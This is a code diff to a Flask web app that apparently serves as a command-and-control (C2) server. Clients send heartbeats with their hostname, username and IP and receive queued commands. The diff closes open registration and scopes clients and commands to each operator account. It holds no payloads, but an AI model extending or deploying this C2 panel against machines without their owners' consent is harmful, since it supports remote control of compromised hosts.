@@ -34,6 +34,7 @@ else:
         f.write(app.secret_key)
 
 app.permanent_session_lifetime = timedelta(days=30)
+app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50MB max upload
 
 # --- Database ---
 def get_db():
@@ -90,6 +91,7 @@ def init_db():
         db.execute('''
             CREATE TABLE IF NOT EXISTS clients (
                 client_id TEXT PRIMARY KEY,
+                user_id INTEGER,
                 hostname TEXT,
                 username TEXT,
                 ip TEXT,
@@ -244,6 +246,11 @@ def auth_register():
 
     with get_db() as db:
         user_count = db.execute('SELECT COUNT(*) FROM users').fetchone()[0]
+        if user_count > 0:
+            user = get_current_user()
+            if not user or user['role'] != 'admin':
+                return jsonify({'error': 'Registration is closed. Contact admin.'}), 403
+
         role = 'admin' if user_count == 0 else 'user'
 
         existing = db.execute('SELECT id FROM users WHERE username = ?', (username,)).fetchone()
@@ -258,8 +265,9 @@ def auth_register():
         user_id = cursor.lastrowid
         db.commit()
 
-    session.permanent = True
-    session['user_id'] = user_id
+    if not get_current_user():
+        session.permanent = True
+        session['user_id'] = user_id
 
     return jsonify({
         'success': True,
@@ -727,6 +735,7 @@ def c2_heartbeat():
         user = db.execute('SELECT id FROM users WHERE api_key = ?', (key,)).fetchone()
         if not user:
             return jsonify({'error': 'unauthorized'}), 401
+    owner_id = user['id']
 
     data = request.json or {}
     client_id = data.get('client_id', '')
@@ -738,14 +747,14 @@ def c2_heartbeat():
 
     with get_db() as db:
         db.execute('''
-            INSERT INTO clients (client_id, hostname, username, ip, last_heartbeat)
-            VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
+            INSERT INTO clients (client_id, user_id, hostname, username, ip, last_heartbeat)
+            VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
             ON CONFLICT(client_id) DO UPDATE SET
                 hostname = excluded.hostname,
                 username = excluded.username,
                 ip = excluded.ip,
                 last_heartbeat = CURRENT_TIMESTAMP
-        ''', (client_id, hostname, username, ip))
+        ''', (client_id, owner_id, hostname, username, ip))
         db.commit()
     return jsonify({'status': 'ok'})
 
@@ -777,8 +786,9 @@ def c2_get_command():
 @app.route('/api/c2/clients', methods=['GET'])
 @login_required
 def c2_list_clients():
+    user = request.current_user
     with get_db() as db:
-        rows = db.execute('SELECT client_id, hostname, username, ip, last_heartbeat, pending_command FROM clients ORDER BY last_heartbeat DESC').fetchall()
+        rows = db.execute('SELECT client_id, hostname, username, ip, last_heartbeat, pending_command FROM clients WHERE user_id = ? ORDER BY last_heartbeat DESC', (user['id'],)).fetchall()
     clients = []
     for r in rows:
         clients.append({
@@ -795,6 +805,7 @@ def c2_list_clients():
 @app.route('/api/c2/command', methods=['POST'])
 @login_required
 def c2_send_command():
+    user = request.current_user
     data = request.json or {}
     client_id = data.get('client_id', '')
     command = data.get('command', '')
@@ -802,7 +813,10 @@ def c2_send_command():
         return jsonify({'error': 'missing fields'}), 400
 
     with get_db() as db:
-        db.execute('UPDATE clients SET pending_command = ? WHERE client_id = ?', (command, client_id))
+        client = db.execute('SELECT client_id FROM clients WHERE client_id = ? AND user_id = ?', (client_id, user['id'])).fetchone()
+        if not client:
+            return jsonify({'error': 'client not found'}), 404
+        db.execute('UPDATE clients SET pending_command = ? WHERE client_id = ? AND user_id = ?', (command, client_id, user['id']))
         db.commit()
     return jsonify({'success': True})
 
